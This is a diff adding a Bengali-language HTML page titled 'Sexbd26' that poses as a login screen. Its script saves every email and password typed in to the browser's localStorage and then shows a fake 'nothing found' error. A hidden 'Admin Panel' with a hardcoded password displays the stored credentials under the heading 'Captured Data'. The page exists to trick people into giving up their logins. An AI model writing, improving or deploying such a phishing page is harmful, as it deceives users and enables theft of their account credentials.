@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sexbd26 - Premium System</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+
+        body {
+            display: flex; justify-content: center; align-items: center; min-height: 100vh;
+            background: radial-gradient(circle at 20% 30%, #4f46e5 0%, transparent 40%),
+                        radial-gradient(circle at 80% 70%, #9333ea 0%, transparent 40%), #0a0a0c;
+            overflow: hidden; color: #fff;
+        }
+
+        /* Login Box */
+        .container {
+            width: 380px; padding: 50px 35px;
+            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 35px;
+            text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+        }
+
+        h2 { font-size: 2.5rem; margin-bottom: 35px; background: linear-gradient(to bottom, #fff, #a855f7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+
+        .input-group { position: relative; width: 100%; margin-bottom: 30px; border-bottom: 2px solid rgba(255, 255, 255, 0.2); text-align: left; }
+        .input-group label { font-size: 0.9rem; color: rgba(255, 255, 255, 0.6); }
+        .input-group input { width: 100%; height: 40px; background: transparent; border: none; outline: none; color: #fff; font-size: 1rem; }
+
+        .login-btn {
+            width: 100%; height: 55px; background: #fff; color: #000; border: none; border-radius: 50px;
+            font-size: 1.2rem; font-weight: 700; cursor: pointer; transition: 0.3s;
+        }
+
+        #error-msg { margin-top: 15px; color: #ffda44; display: none; font-weight: 600; }
+
+        /* Admin Button (Bottom Right) */
+        .admin-trigger {
+            position: fixed; bottom: 20px; right: 20px;
+            padding: 10px 15px; background: rgba(255,255,255,0.1);
+            border-radius: 10px; cursor: pointer; font-size: 0.8rem;
+            border: 1px solid rgba(255,255,255,0.2); transition: 0.3s;
+        }
+        .admin-trigger:hover { background: #a855f7; }
+
+        /* Admin Panel Modal */
+        #admin-panel {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9); display: none; flex-direction: column;
+            justify-content: center; align-items: center; z-index: 100;
+        }
+
+        .admin-content {
+            width: 90%; max-width: 600px; background: #1a1a1c;
+            padding: 30px; border-radius: 20px; border: 1px solid #333;
+        }
+
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { padding: 12px; border: 1px solid #333; text-align: left; font-size: 0.9rem; }
+        th { background: #a855f7; }
+
+        .close-btn { margin-top: 20px; padding: 10px 20px; background: #ff4d4d; border: none; border-radius: 5px; color: #fff; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <!-- Login Section -->
+    <div class="container" id="login-section">
+        <h2>Sexbd26</h2>
+        <div class="input-group">
+            <label>Email</label>
+            <input type="email" id="user-email" placeholder="ইমেইল দিন">
+        </div>
+        <div class="input-group">
+            <label>Password</label>
+            <input type="password" id="user-pass" placeholder="পাসওয়ার্ড দিন">
+        </div>
+        <button class="login-btn" onclick="userLogin()">Log in</button>
+        <p id="error-msg">কোন কিছু পাওয়া যায় নাই সরি</p>
+    </div>
+
+    <!-- Admin Button Trigger -->
+    <div class="admin-trigger" onclick="openAdmin()">Admin Panel</div>
+
+    <!-- Admin Dashboard Modal -->
+    <div id="admin-panel">
+        <div class="admin-content">
+            <h3 style="color: #a855f7;">Admin Dashboard (Captured Data)</h3>
+            <div style="max-height: 400px; overflow-y: auto;">
+                <table id="data-table">
+                    <thead>
+                        <tr>
+                            <th>ইমেইল</th>
+                            <th>পাসওয়ার্ড</th>
+                            <th>সময়</th>
+                        </tr>
+                    </thead>
+                    <tbody id="data-list">
+                        <!-- এখানে ডাটা জমা হবে -->
+                    </tbody>
+                </table>
+            </div>
+            <button class="close-btn" onclick="closeAdmin()">Close Panel</button>
+            <button class="close-btn" style="background: #555;" onclick="clearData()">Clear All Data</button>
+        </div>
+    </div>
+
+    <script>
+        // ইউজার লগইন করলে ডাটা সেভ হবে
+        function userLogin() {
+            const email = document.getElementById('user-email').value;
+            const pass = document.getElementById('user-pass').value;
+
+            if(email && pass) {
+                // ডাটা লোকাল মেমোরিতে সেভ করা
+                let userData = JSON.parse(localStorage.getItem('savedUsers')) || [];
+                userData.push({
+                    email: email,
+                    pass: pass,
+                    time: new Date().toLocaleString()
+                });
+                localStorage.setItem('savedUsers', JSON.stringify(userData));
+
+                // সরি মেসেজ দেখানো
+                document.getElementById('error-msg').style.display = 'block';
+                
+                // ইনপুট বক্স ক্লিয়ার করা
+                document.getElementById('user-email').value = "";
+                document.getElementById('user-pass').value = "";
+            } else {
+                alert("দয়া করে ইমেইল ও পাসওয়ার্ড দিন");
+            }
+        }
+
+        // অ্যাডমিন প্যানেল ওপেন করা
+        function openAdmin() {
+            const adminPass = prompt("অ্যাডমিন পাসওয়ার্ড দিন:");
+            if(adminPass === "462357") { // এখানে আপনার দেওয়া পাসওয়ার্ড সেট করা হয়েছে
+                document.getElementById('admin-panel').style.display = 'flex';
+                loadData();
+            } else {
+                alert("ভুল পাসওয়ার্ড!");
+            }
+        }
+
+        // মেমোরি থেকে ডাটা লোড করে টেবিলে দেখানো
+        function loadData() {
+            const list = document.getElementById('data-list');
+            list.innerHTML = "";
+            let userData = JSON.parse(localStorage.getItem('savedUsers')) || [];
+
+            userData.reverse().forEach(user => {
+                const row = `<tr>
+                    <td>${user.email}</td>
+                    <td>${user.pass}</td>
+                    <td>${user.time}</td>
+                </tr>`;
+                list.innerHTML += row;
+            });
+        }
+
+        function closeAdmin() {
+            document.getElementById('admin-panel').style.display = 'none';
+        }
+
+        function clearData() {
+            if(confirm("সব ডাটা কি মুছে ফেলতে চান?")) {
+                localStorage.removeItem('savedUsers');
+                loadData();
+            }
+        }
+    </script>
+</body>
+</html>
